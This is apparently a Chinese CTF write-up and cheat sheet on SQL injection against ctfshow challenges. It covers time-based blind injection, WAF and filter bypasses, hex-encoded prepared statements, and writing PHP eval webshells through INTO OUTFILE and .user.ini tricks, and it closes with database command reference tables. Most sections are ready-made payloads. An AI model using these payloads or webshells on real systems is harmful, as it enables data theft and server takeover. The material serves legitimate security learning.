![image-20260209175318890](posts/530fceb2/images/image-20260209175318890.webp)

查询语句是根据筛选条件id进行查询，waf拦截了sleep函数

benchmark等价函数绕过就是使用benchmark替代sleep函数

`BENCHMARK(count, expr)`：count表示执行次数，expr表示需要执行的函数
例如：`benchmark(400000,md5(1))`:达到大量占用服务器资源的效果，从而使回显出现延迟，从而知道SQL注入是否成功(**多并发环境会崩，获取长度的可以高并发，获取字符取最长时间的即可，获取字符的改为单线程并提高计算，单线程的大约0.8秒**)

1. 获取数据库长度

	```mysql
	1) or if(length(database())=1,benchmark(400000,md5(1)),null)-- a
	```

2. 获取数据库

	```mysql
	1) or if(ascii(substr(database(),1,1))=1,benchmark(1000000,md5(1)),null)-- a
	```

3. 获取数据表长度

	```mysql
	1) or if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=1,benchmark(400000,md5(1)),null)-- a
	```

4. 获取数据表

	```mysql
	1) or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=1,benchmark(1000000,md5(1)),null)-- a
	```

5. 获取列长度

	```mysql
	1) or if(length((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_user5' and table_schema=database()))=1,benchmark(400000,md5(1)),null)-- a
	```

6. 获取列

	```mysql
	1) or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_user5' and table_schema=database()),1,1))=1,benchmark(1000000,md5(1)),null)-- a
	```

7. 获取flagaabc这一列的数据项长度

	```mysql
	1) or if(length((select group_concat(flagaabc) from ctfshow_flagxccb))=1,benchmark(400000,md5(1)),null)-- a
	```

8. 获取flagaabc这一列的数据项

	```mysql
	1) or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb),1,1))=1,benchmark(1000000,md5(1)),null)-- a
	```

##### 笛卡尔积绕过

  这里用ctfshow-web218为例子，题目如下

![image-20260209214709112](posts/530fceb2/images/image-20260209214709112.webp)

查询语句是根据筛选条件id进行查询，waf拦截了sleep、benchmark函数

笛卡尔积绕过是使服务器进行大量的查询使其回显时间延迟，从而知道sql注入是否成功

`笛卡尔积`：A有m行，B有n行，A,B组合共有m*n行

(**多并发环境会崩，获取长度的可以高并发，获取字符取最长时间的即可，获取字符的改为单线程并提高计算，单线程的大约2秒**)

1. 获取数据库长度（所有表的行数*所有数据库的行数的4次方）

	```mysql
	1) or if(length(database())=1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.schemata C),null)-- a
	```

2. 获取数据库

	```mysql
	1) or if(ascii(substr(database(),1,1))=1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.schemata C),null)-- a
	```

3. 获取数据表长度

	```mysql
	1) or if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.schemata C),null)-- a
	```

4. 获取数据表

	```mysql
	1) or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.schemata C),null)-- a
	```

5. 获取列长度

	```mysql
	1) or if(length((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_user5' and table_schema=database()))=1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.schemata C),null)-- a
	```

6. 获取列

	```mysql
	1) or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_user5' and table_schema=database()),1,1))=1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.schemata C),null)-- a
	```

7. 获取flagaac这一列的数据项长度

	```mysql
	1) or if(length((select group_concat(flagaabc) from ctfshow_flagxccb))=1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.schemata C),null)-- a
	```

8. 获取flagaac这一列的数据项

	```mysql
	1) or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb),1,1))=1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.schemata C),null)-- a
	```

#### 注释符过滤

##### 引号拼接绕过

  这里用ctfshow-web539为例，题目如下：

![image-20260301220408088](posts/530fceb2/images/image-20260301220408088.webp)

这题还是正常打报错注入，只是由于注释符被过滤了，只能使用引号拼接绕过

假设原句为如下：

```mysql
select * from users where '$_GET['id']';
```

引号拼接绕过如下：

```mysql
select * from users where '1' union database()'';
```

1. 获取数据库名

	```mysql
	' or updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),3) or'
	```

2. 获取表名

	将值括号闭合payload如下：

	```mysql
	' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow')),3) or'
	```

3. 获取列名

	```mysql
	' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag' and table_schema='ctfshow')),3) or'
	```

4. 获取数据项

	substr获取前30字符：

	```mysql
	' or updatexml(1,concat(0x7e,substr((select flag4 from ctfshow.flag),1,30)),3) or'
	```

	substr获取后30字符：

	```mysql
	' or updatexml(1,concat(0x7e,substr((select flag4 from ctfshow.flag),31,30)),3) or'
	```

##### ;%00绕过

  这里用ctfshow-web539为例，题目如下：

![image-20260301220408088](posts/530fceb2/images/image-20260301220408088.webp)

直接使用00截断，强行结束sql语句，从而达到注释的效果

1. 获取数据库名

	```mysql
	' or updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),3);%00
	```

2. 获取表名

	将值括号闭合payload如下：

	```mysql
	' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow')),3);%00
	```

3. 获取列名

	```mysql
	' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag' and table_schema='ctfshow')),3);%00
	```

4. 获取数据项

	substr获取前30字符：

	```mysql
	' or updatexml(1,concat(0x7e,substr((select flag4 from ctfshow.flag),1,30)),3);%00
	```

	substr获取后30字符：

	```mysql
	' or updatexml(1,concat(0x7e,substr((select flag4 from ctfshow.flag),31,30)),3);%00
	```



#### 单引号过滤

##### 转义符绕过

  这里用ctfshow-web234为例子，题目如下：
![image-20260223175036574](posts/530fceb2/images/image-20260223175036574.webp)

查询语句是update查询，waf拦截过滤了单引号

这里我们采用转义符绕过，即第一个password处填写\

则原句前段如下：

```mysql
update ctfshow_user set pass = '\' where username = '$username'
```

我们将username写为括号内执行sql语句，即可完成注入

例如：`password=\&username=,username=select database()#`

则原句如下：

```mysql
update ctfshow_user set pass = '\' where username = ',username=select database()#'
```

即后端pass=\' where username = 

username=select database()

注入点即为username，接下来用union注入一步一步拿去数据项即可，这里我只给最后部分

```mysql
password=\&username=,username=(select group_concat(flagass23s3) from flag23a)%23
```

#### 空格过滤

##### 注释符绕过

  这里用ctfshow-web177为例子，题目如下

![image-20260130180559492](posts/530fceb2/images/image-20260130180559492.webp)

  返回逻辑显示：有waf对输入进行拦截，经过测试，发现是空格过滤

空格注释符绕过即是将union注入的空格替换成多行注释符即可

注释符：`/**/`

1. 获取数据库

	```mysql
	1'/**/union/**/select/**/1,2,database()%23
	```

	`%23`:`#`也是sql语句中的注释符，因为`--`这个注释符后面要接分隔符，所以直接用`%23`即可,或者你用`--%0b、--%0c、--%0d、--%09`都行（`--%01`到`--%19`可以当作注释符，但是`%01`到`%19`不能当空格）

2. 获取数据表

	```mysql
	1'/**/union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()%23
	```

3. 获取数据列

	```mysql
	1'/**/union/**/select/**/group_concat(column_name),2,3/**/from/**/information_schema.columns/**/where/**/table_name='ctfshow_user'/**/and/**/table_schema=database()%23
	```

4. 获取数据项

	```mysql
	1'/**/union/**/select/**/group_concat(username),group_concat(password),3/**/from/**/ctfshow_user%23
	```

  这里我写马进去看了一下后端代码，只用正则过滤了空格，感兴趣的也可以进去看一下

```mysql
1'%0cunion%0cselect%0cid,"<?=@eval($_POST[1]);?>",password%0cfrom%0cctfshow_user%0cinto%0coutfile%0c'/var/www/html/shell.php'%0c%23
```

##### Tab之类绕过

| URL编码 | 名称       | ASCII/Unicode | 常见用途               |
| :------ | :--------- | :------------ | :--------------------- |
| %20     | 空格       | 0x20 (32)     | 普通单词分隔           |
| %09     | 水平制表符 | 0x09 (9)      | 缩进、表格对齐         |
| %0a     | 换行符     | 0x0A (10)     | 新行开始               |
| %0b     | 垂直制表符 | 0x0B (11)     | 纵向表格对齐           |
| %0c     | 换页符     | 0x0C (12)     | 分页符                 |
| %0d     | 回车符     | 0x0D (13)     | 回车（与\n组合为\r\n） |
| %a0     | 不换行空格 | 0xA0 (160)    | 防止自动换行的空格     |

  这里用ctfshow-web177为例子，题目如下

![image-20260130180559492](posts/530fceb2/images/image-20260130180559492.webp)

  返回逻辑显示：有waf对输入进行拦截，经过测试，发现是空格过滤

空格Tab之类绕过即是将union注入的空格替换成Tab之类即可

经过测试这些可以代替：`%09、%0a、%0b、%0c、%0d`

1. 获取数据库

  `%09`:

  ```mysql
1'%09union%09select%091,2,database()%23
  ```

  `%0a`:

  ```mysql
1'%0aunion%0aselect%0a1,2,database()%23
  ```

  `%0b`:

  ```mysql
1'%0bunion%0bselect%0b1,2,database()%23
  ```

  `%0c`:

  ```mysql
1'%0cunion%0cselect%0c1,2,database()%23
  ```

  `%0d`:

  ```mysql
1'%0dunion%0dselect%0d1,2,database()%23
  ```

2. 获取数据表

	`%09`:

	```mysql
	1'%09union%09select%091,2,group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()%23
	```

	`%0a`:

	```mysql
	1'%0aunion%0aselect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%23
	```

	`%0b`:

	```mysql
	1'%0bunion%0bselect%0b1,2,group_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=database()%23
	```

	`%0c`:

	```mysql
	1'%0cunion%0cselect%0c1,2,group_concat(table_name)%0cfrom%0cinformation_schema.tables%0cwhere%0ctable_schema=database()%23
	```

	`%0d`:

	```mysql
	1'%0dunion%0dselect%0d1,2,group_concat(table_name)%0dfrom%0dinformation_schema.tables%0dwhere%0dtable_schema=database()%23
	```

3. 获取数据列

	`%09`:

	```mysql
	1'%09union%09select%09group_concat(column_name),2,3%09from%09information_schema.columns%09where%09table_name='ctfshow_user'%09and%09table_schema=database()%23
	```

	`%0a`:

	```mysql
	1'%0aunion%0aselect%0agroup_concat(column_name),2,3%0afrom%0ainformation_schema.columns%0awhere%0atable_name='ctfshow_user'%0aand%0atable_schema=database()%23
	```

	`%0b`:

	```mysql
	1'%0bunion%0bselect%0bgroup_concat(column_name),2,3%0bfrom%0binformation_schema.columns%0bwhere%0btable_name='ctfshow_user'%0band%0btable_schema=database()%23
	```

	`%0c`:

	```mysql
	1'%0cunion%0cselect%0cgroup_concat(column_name),2,3%0cfrom%0cinformation_schema.columns%0cwhere%0ctable_name='ctfshow_user'%0cand%0ctable_schema=database()%23
	```

	`%0d`:

	```mysql
	1'%0dunion%0dselect%0dgroup_concat(column_name),2,3%0dfrom%0dinformation_schema.columns%0dwhere%0dtable_name='ctfshow_user'%0dand%0dtable_schema=database()%23
	```

4. 获取数据项

	`%09`:

	```mysql
	1'%09union%09select%09group_concat(username),group_concat(password),3%09from%09ctfshow_user%23
	```

	`%0a`:

	```mysql
	1'%0aunion%0aselect%0agroup_concat(username),group_concat(password),3%0afrom%0actfshow_user%23
	```

	`%0b`:

	```mysql
	1'%0bunion%0bselect%0bgroup_concat(username),group_concat(password),3%0bfrom%0bctfshow_user%23
	```

	`%0c`:

	```mysql
	1'%0cunion%0cselect%0cgroup_concat(username),group_concat(password),3%0cfrom%0cctfshow_user%23
	```

	`%0d`:

	```mysql
	1'%0dunion%0dselect%0dgroup_concat(username),group_concat(password),3%0dfrom%0dctfshow_user%23
	```

##### 括号绕过

  这里用ctfshow-web177为例子，题目如下

![image-20260130180559492](posts/530fceb2/images/image-20260130180559492.webp)

  返回逻辑显示：有waf对输入进行拦截，经过测试，发现是空格过滤

括号绕过即是将union注入的需要空格替换成将函数进行括号即可

**在`update、insert、delete`语句中无法使用括号绕过，推荐使用反引号包裹表名列名**

1. 获取数据库

  ```mysql
1'union(select(1),(2),database())%23
  ```

2. 获取数据表

	```mysql
	1'union(select(1),(2),(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))%23
	```

3. 获取数据列

	```mysql
	1'union(select(group_concat(column_name)),(2),(3)from(information_schema.columns)where(table_name='ctfshow_user')and(table_schema=database()))%23
	```

4. 获取数据项

	```mysql
	1'union(select(group_concat(username)),(group_concat(password)),(3)from(ctfshow_user))%23
	```

##### mysql直接识别的进制

1. 十六进制

	```mysql
	SELECT 0x48656C6C6F;  -- 输出 'Hello'
	SELECT 0x31;         -- 输出 '1' (数字或字符)
	```

2. 二进制

	```mysql
	SELECT b'1010';      -- 输出 10
	SELECT 0b1010;       -- 输出 10
	```

3. 八进制

	```mysql
	SELECT 010;          -- 输出 8（注意：010 默认是八进制）
	```

#### and过滤

##### &&绕过

```text
and改成&&即可
```

#### or 过滤

##### ||绕过

```text
or改成||即可
```

##### 等价数据库绕过

  这里用ctfshow-web235为例子，题目如下：
![image-20260223165808457](posts/530fceb2/images/image-20260223165808457.webp)

查询语句是update更新语句，返回逻辑：waf拦截or和单引号

这里单引号使用转义字符\绕过，or本身可以使用||绕过，但是对题目的限制主要是information_shcema数据库无法使用

这里information_schema.schemata用databases()字段为

```mysql
select database()
```

绕过information_schema.tables用mysql.innodb_table_stats绕过

```mysql
select group_concat(table_name) from mysql.innodb_table_stats
```

information_schema.columns用无列名注入绕过

```mysql
password=\&username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#
```

#### 预编译编码绕过

   这里用ctfshow-web226为例子，题目如下

![image-20260223142948786](posts/530fceb2/images/image-20260223142948786.webp)

查询语句：根据username传参进行条件查询，三列回显，返回逻辑：waf拦截：SQL注入写马，union注入，增删改查都被拦截，show也被拦截

这里采用prepare execute进行预编译绕过

预编译的用法就是一个SQL语句模板，然后多次执行它。也是用来防御sql注入的手段之一。

```mysql
SET @payload = 0x53514C454354202A2046524F4D2075736572733B;
-- 0x53514C454354... = "SELECT * FROM users;"
PREPARE stmt FROM @payload;
EXECUTE stmt;
```

这道题目我们直接预编译select查看表名、列名、数据项名即可

1. 查看表名

	```mysql
	user1';prepare stmt from 0x73656c65637420312c322c7461626c655f6e616d652066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829;execute stmt;
	
	-- 等于
	
	select 1,2,table_name from information_schema.tables where table_schema=database()
	```

2. 查看列名

	```mysql
	user1';prepare stmt from 0x73656c65637420636f6c756d6e5f6e616d652c322c332066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d2763746673685f6f775f666c616761732720616e64207461626c655f736368656d613d64617461626173652829;execute stmt;
	
	-- 等于
	
	select column_name,2,3 from information_schema.columns where table_name='ctfsh_ow_flagas' and table_schema=database()
	```

3. 查看数据项值

	```mysql
	user1';prepare stmt from 0x73656c65637420666c61676173622c322c332066726f6d2063746673685f6f775f666c61676173;execute stmt;
	
	-- 等于
	
	select flagasb,2,3 from ctfsh_ow_flagas
	```

#### 无列名注入

参考文章：[(CTF|mysql之无列名注入 - 知乎](https://zhuanlan.zhihu.com/p/98206699)

  这里用ctfshow-web235为例子，题目如下：
![image-20260223165808457](posts/530fceb2/images/image-20260223165808457.webp)

查询语句是update更新语句，返回逻辑：waf拦截or和单引号

简单来说即是使用union查询将列名顶掉，如下

![image-20260223171505053](posts/530fceb2/images/image-20260223171505053.webp)

然后我们再对已知被顶掉的列名进行查询，例如查询第2列

![image-20260223171911783](posts/530fceb2/images/image-20260223171911783.webp)

**这里必须要对2和from后的语句进行标注和取别名，用来表明2是一列数据，后面的语句是一个表名**

如果`被禁，对列取别名然后进行查询，如下对第二列取别名为b：

```mysql
select b from (select 1,2 as b,3,4 union selct * from dept)b;
```

回到题目，这里直接对列名进行自定义列名顶掉也就是无列名注入，题目限制一行一行取值

```mysql
password=\&username=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#
```



### sql注入写马

#### 使用条件以及限制

| 条件                            | 说明                          | 检查方法                                                     |
| :------------------------------ | :---------------------------- | :----------------------------------------------------------- |
| **1. 数据库用户需FILE权限**     | `INTO OUTFILE` 需要FILE特权   | `SELECT file_priv FROM mysql.user WHERE user = current_user()` |
| **2. 知道Web目录绝对路径**      | 必须知道网站根目录物理路径    | 报错信息、探针文件、`@@basedir`推断                          |
| **3. 目录有写权限**             | Web目录MySQL用户可写入        | 尝试写测试文件                                               |
| **4. secure_file_priv不为NULL** | MySQL安全配置不能限制文件导出 | `SHOW VARIABLES LIKE 'secure_file_priv'`                     |
| **5. 单/双引号未被转义**        | 能够闭合引号写入代码          | 常规注入测试                                                 |

#### 使用示例

  这里以ctfshow-web174为例，题目如下：

![image-20260122221413974](posts/530fceb2/images/image-20260122221413974.webp)

  这里对输出进行了过滤，只有在没有flag以及没有数字的情况下，才会进行回显，这里我就直接尝试写马了

1. 首先尝试能不能将查询结果输出到文件当中

  ```mysql
1' union select username,password from ctfshow_user4 into outfile '/var/www/html/flag.txt' -- a
  ```

  这里因为知道ctfshow靶场的网站地址都是`/var/www/html`,正常sql注入写马需要很多权限

  ![image-20260122221930064](posts/530fceb2/images/image-20260122221930064.webp)

    输出成功，拿到flag，这里确定了写入文件的权限

  > ctfshow{3bf4551a-455d-4ce4-971a-064a03bb7724}

2. 接下来我们尝试直接将webshell写入文件中

	```mysql
	1' union select "<?php @eval($_POST[1]);?>",password from ctfshow_user4 into outfile '/var/www/html/shell.php' -- a
	```

	如果空格被过滤将`<?php`改为`<?=`短标签

	```mysql
	1'/**/union/**/select/**/"<?=@eval($_POST[1]);?>",password/**/from/**/ctfshow_user4/**/into/**/outfile/**/'/var/www/html/shell.php'/**/--/**/a
	```

	这个查询结果是正常的，因为被过滤flag![image-20260122224312345](posts/530fceb2/images/image-20260122224312345.webp)

	写马成功![image-20260122224228170](posts/530fceb2/images/image-20260122224228170.webp)

#### 文件上传写mysql马

  这里以ctfshow-web224为例

参考文章：[ctf.show](https://ctf.show/writeups/2426545)

[ctfshow-web入门-sql注入（web224-web230）文件类型注入、routines存储过程与函数状态、handler语句、预处理prepare+execute_ctfshow web224-CSDN博客](https://blog.csdn.net/Myon5/article/details/141323202)

[CTF 文件上传漏洞解析 · GitHub Copilot](https://github.com/copilot/c/4c75495c-2893-4708-8bbd-da1d08ceef9a)

登录成功之后题目如下：

![image-20260223132022611](posts/530fceb2/images/image-20260223132022611.webp)

写入文件mysql马即可

```text
C64File "');select 0x3c3f3d406576616c28245f504f53545b315d293b3f3e into outfile '/var/www/html/1.php';--+
```

![image-20260223133654686](posts/530fceb2/images/image-20260223133654686.webp)

可以看到最后一个文件类型是我们上传的这个txt，被识别为PC64了

拿到webshell之后可以看到后端代码

![image-20260223133506908](posts/530fceb2/images/image-20260223133506908.webp)

关键就在这个filetype被我们控制从而造成了写马成功

#### file语句写马

##### file的基本用法

  这里以ctfshow-web242为例，题目如下：

![image-20260228211159281](posts/530fceb2/images/image-20260228211159281.webp)

查询语句一个表的所有数据，并且其写入一个目录文件中，返回逻辑无waf过滤

file的用法如下：

```mysql
SELECT 列1, 列2, ...
INTO OUTFILE '文件路径'
[CHARACTER SET 字符集]
[导出选项]
FROM 表名
[WHERE 条件]
[其他子句];
```

| 子句                            | 说明                                            |
| ------------------------------- | ----------------------------------------------- |
| `FIELDS TERMINATED BY`          | 设置字段之间的分隔符，默认是制表符 `\t`。       |
| `FIELDS ENCLOSED BY`            | 用指定字符括住所有字段的值。                    |
| `FIELDS OPTIONALLY ENCLOSED BY` | 只括住字符型字段（如 CHAR、VARCHAR、TEXT 等）。 |
| `FIELDS ESCAPED BY`             | 设置转义字符，用于处理特殊字符。                |
| `LINES STARTING BY`             | 设置每行开头的字符。                            |
| `LINES TERMINATED BY`           | 设置行结束符，默认是 `\n`。                     |

导出示例

```mysql
SELECT id, username, email, age
INTO OUTFILE '/tmp/users.txt'
FIELDS TERMINATED BY ',' -- 使用逗号作为字段分隔符
ENCLOSED BY '"' -- 所有字段用双引号括起来
OPTIONALLY ENCLOSED BY '"' -- 只对字符串类型字段加引号
ESCAPED BY '\\' -- 使用转义字符
LINES STARTING BY 'USER: ' -- 每行以特定前缀开始
LINES TERMINATED BY ';\n' -- 自定义行结束符
FROM users;

-- 输出示例：
"1","张三","zhangsan@email.com","25"
"2","李四","lisi@email.com","30"
```

回到题目，这里我们直接在每行末尾加上webshell即可，payload如下：

```mysql
file.php' LINES TERMINATED BY '<?=@eval($_POST[1]);?>'#
```

##### 上传配置文件写马

  这里以ctfshow-web243为例，题目如下：

![image-20260228222115111](posts/530fceb2/images/image-20260228222115111.webp)

用于php字符存在过滤的情况：

简单来说就是先上传配置文件(nginx是.user.ini，apache2是.htaccess)，在配置文件允许加载index.php时先添加我们的木马，从而达到实现webshell的目的，这个具体的点是在于文件上传

上传配置文件(其中在每行开头加了`;`用于注释掉从表ctfshow_user中读出的内容)：

```payload
filename=.user.ini' lines starting by ';' terminated by 0x0a6175746f5f70726570656e645f66696c653d312e6a70670a;#
//也就是如下语句，只不过在`auto_prepend_file=1.jpg`前后加了%0a用于换行，保证注入的内容单独在一行
filename=.user.ini' lines starting by ';' terminated by "auto_prepend_file=1.jpg"#
```

再上传图片马即可

```payload
filename=1.jpg' LINES TERMINATED BY '<?=eval($_POST[1]);?>'#
```

#### 不同数据库之间的所需权限不同

| 数据库         | 写马方法                         | 特殊限制               |
| :------------- | :------------------------------- | :--------------------- |
| **MySQL**      | `INTO OUTFILE`、日志文件         | `secure_file_priv`配置 |
| **SQL Server** | `xp_cmdshell`+echo命令、差异备份 | 需开启xp_cmdshell      |
| **Oracle**     | 用UTL_FILE包、Java写文件         | 需DBA权限和目录对象    |
| **PostgreSQL** | `COPY ... TO`、大对象写入        | 需超级用户权限         |
| **Access**     | 几乎无法写马                     | 无文件操作函数         |

## 奇怪但可能有用

### mysql的存储过程

  这里以ctfshow-web227为例，题目如下：
![image-20260223150607231](posts/530fceb2/images/image-20260223150607231.webp)

绕过是与上一题一样，都是使用预编译和编码绕过，但是flag不存在表中，而是存在于mysql的存储过程中，这里对存储过程的定义是**保存起来、可以反复调用的SQL代码片段**，类似于预编译，但是是永久保存起来的

这题就把flag存放于存储过程中了，这个会被记录在mysql的系统数据库中information_schema的Routines表中

```mysql
user1';prepare stmt from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;execute stmt;

-- 等于

SELECT * FROM information_schema.Routines
```



## 常用数据库的基本属性

### MySQL/MariaDB

| 属性/功能  | 查询命令                                     | 示例/说明                      |
| :--------- | :------------------------------------------- | :----------------------------- |
| 当前数据库 | `SELECT DATABASE();`                         | 返回当前连接的数据库名         |
| 数据库版本 | `SELECT VERSION();`                          | 返回MySQL版本信息              |
| 服务器状态 | `SHOW STATUS;`                               | 显示服务器状态变量             |
| 当前用户   | `SELECT USER();` 或 `SELECT CURRENT_USER();` | 返回当前登录用户               |
| 连接ID     | `SELECT CONNECTION_ID();`                    | 当前连接的ID                   |
| 最后插入ID | `SELECT LAST_INSERT_ID();`                   | 最后自动生成的AUTO_INCREMENT值 |
| 字符集     | `SHOW VARIABLES LIKE 'character_set%';`      | 显示字符集设置                 |
| 存储引擎   | `SHOW ENGINES;`                              | 显示支持的存储引擎             |
| 进程列表   | `SHOW PROCESSLIST;`                          | 显示当前连接和进程             |
| 系统变量   | `SHOW VARIABLES;`                            | 显示所有系统变量               |

### PostgreSQL

| 属性/功能  | 查询命令                                         | 示例/说明          |
| :--------- | :----------------------------------------------- | :----------------- |
| 当前数据库 | `SELECT current_database();`                     | 返回当前数据库名   |
| 数据库版本 | `SELECT version();`                              | 返回PostgreSQL版本 |
| 当前用户   | `SELECT current_user;`                           | 当前登录用户名     |
| 会话用户   | `SELECT session_user;`                           | 会话用户名         |
| 连接信息   | `SELECT inet_server_addr(), inet_server_port();` | 服务器地址和端口   |
| 当前模式   | `SELECT current_schema();`                       | 当前使用的模式     |
| 字符编码   | `SHOW server_encoding;`                          | 服务器字符编码     |
| 时区       | `SHOW timezone;`                                 | 当前时区设置       |
| 活跃连接   | `SELECT * FROM pg_stat_activity;`                | 查看活跃连接       |
| 数据库列表 | `SELECT datname FROM pg_database;`               | 所有数据库列表     |

### SQL Server

| 属性/功能  | 查询命令                                        | 示例/说明          |
| :--------- | :---------------------------------------------- | :----------------- |
| 当前数据库 | `SELECT DB_NAME();`                             | 当前数据库名称     |
| 数据库版本 | `SELECT @@VERSION;`                             | SQL Server版本信息 |
| 服务器名称 | `SELECT @@SERVERNAME;`                          | 服务器实例名称     |
| 服务名称   | `SELECT @@SERVICENAME;`                         | SQL Server服务名称 |
| 当前用户   | `SELECT SUSER_NAME();` 或 `SELECT SYSTEM_USER;` | 当前登录用户       |
| 会话ID     | `SELECT @@SPID;`                                | 当前会话ID         |
| 语言设置   | `SELECT @@LANGUAGE;`                            | 当前语言设置       |
| 连接数     | `SELECT * FROM sys.dm_exec_sessions;`           | 查看会话信息       |
| 数据库ID   | `SELECT DB_ID();`                               | 当前数据库ID       |
| 最近错误   | `SELECT @@ERROR;`                               | 最后执行的错误号   |

### Oracle

| 属性/功能  | 查询命令                                                     | 示例/说明    |
| :--------- | :----------------------------------------------------------- | :----------- |
| 实例信息   | `SELECT * FROM v$instance;`                                  | 实例详细信息 |
| 数据库信息 | `SELECT * FROM v$database;`                                  | 数据库信息   |
| 版本信息   | `SELECT * FROM v$version;`                                   | 数据库版本   |
| 当前用户   | `SELECT USER FROM DUAL;`                                     | 当前用户名   |
| 实例名称   | `SELECT INSTANCE_NAME FROM v$instance;`                      | 实例名       |
| 主机名     | `SELECT HOST_NAME FROM v$instance;`                          | 主机名       |
| 会话信息   | `SELECT sid, serial#, username FROM v$session;`              | 会话信息     |
| 当前会话   | `SELECT sys_context('USERENV','SID') FROM DUAL;`             | 当前会话ID   |
| 服务名称   | `SELECT sys_context('USERENV','SERVICE_NAME') FROM DUAL;`    | 服务名       |
| 字符集     | `SELECT * FROM nls_database_parameters WHERE parameter LIKE '%CHARACTERSET';` | 字符集设置   |

### SQLite

| 属性/功能  | 查询命令/方法                           | 示例/说明           |
| :--------- | :-------------------------------------- | :------------------ |
| 数据库版本 | `SELECT sqlite_version();`              | SQLite版本          |
| 编译选项   | `PRAGMA compile_options;`               | 编译时选项          |
| 数据库大小 | `.databases` (CLI命令)                  | 显示附加的数据库    |
| 表列表     | `.tables` (CLI命令)                     | 显示所有表          |
| 当前时间   | `SELECT datetime('now');`               | 当前日期时间        |
| 编码格式   | `PRAGMA encoding;`                      | 数据库编码          |
| 外键状态   | `PRAGMA foreign_keys;`                  | 外键约束状态        |
| 自动清理   | `PRAGMA auto_vacuum;`                   | 自动清理设置        |
| 内存使用   | `PRAGMA page_count * PRAGMA page_size;` | 计算数据库大小      |
| 最后错误   | 程序API获取                             | 通过API获取错误信息 |

### MongoDB (NoSQL)

| 属性/功能  | 查询命令                                            | 示例/说明      |
| :--------- | :-------------------------------------------------- | :------------- |
| 当前数据库 | `db.getName()`                                      | 当前数据库名称 |
| 数据库版本 | `db.version()`                                      | MongoDB版本    |
| 服务器状态 | `db.serverStatus()`                                 | 服务器状态信息 |
| 主机信息   | `db.hostInfo()`                                     | 主机系统信息   |
| 连接信息   | `db.currentOp()`                                    | 当前操作信息   |
| 数据库列表 | `show dbs` 或 `db.adminCommand({listDatabases: 1})` | 显示所有数据库 |
| 集合统计   | `db.collection.stats()`                             | 集合统计信息   |
| 用户信息   | `db.getUser(username)`                              | 获取用户信息   |
| 复制集状态 | `rs.status()`                                       | 复制集状态     |
| 分片状态   | `sh.status()`                                       | 分片集群状态   |

### Redis (键值存储)

| 属性/功能  | 查询命令           | 示例/说明        |
| :--------- | :----------------- | :--------------- |
| 服务器信息 | `INFO`             | 全面的服务器信息 |
| 数据库大小 | `DBSIZE`           | 当前数据库键数量 |
| 服务器时间 | `TIME`             | 服务器当前时间   |
| 配置信息   | `CONFIG GET *`     | 获取所有配置     |
| 客户端列表 | `CLIENT LIST`      | 连接的客户端信息 |
| 内存信息   | `INFO memory`      | 内存使用情况     |
| 持久化信息 | `INFO persistence` | RDB/AOF信息      |
| 复制信息   | `INFO replication` | 主从复制信息     |
| 慢查询日志 | `SLOWLOG GET`      | 获取慢查询日志   |
| 监控命令   | `MONITOR`          | 实时监控所有命令 |

## 常见数据库的增删改查语句

### MySQL/MariaDB

| 操作         | 语句示例                                                     | 说明                        |
| :----------- | :----------------------------------------------------------- | :-------------------------- |
| **创建表**   | `CREATE TABLE users (id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(50), age INT);` | 创建users表                 |
| **插入数据** | `INSERT INTO users (name, age) VALUES ('张三', 25);`into可选，如过滤可不加，如：`INSERT  users (name, age) VALUES ('张三', 25);` | 插入单条数据                |
| **批量插入** | `INSERT INTO users (name, age) VALUES ('李四', 30), ('王五', 28);`into可选，如过滤可不加，如：`INSERT users (name, age) VALUES ('李四', 30), ('王五', 28);` | 插入多条数据                |
| **查询数据** | `SELECT * FROM users WHERE age > 25;`                        | 查询年龄大于25的用户        |
| **更新数据** | `UPDATE users SET age = 26 WHERE name = '张三';`             | 更新张三的年龄              |
| **删除数据** | `DELETE FROM users WHERE id = 1;`                            | 删除ID为1的用户             |
| **删除表**   | `DROP TABLE users;`                                          | 删除users表                 |
| **条件查询** | `SELECT name, age FROM users WHERE age BETWEEN 20 AND 30 ORDER BY age DESC;` | 查询20-30岁用户，按年龄降序 |
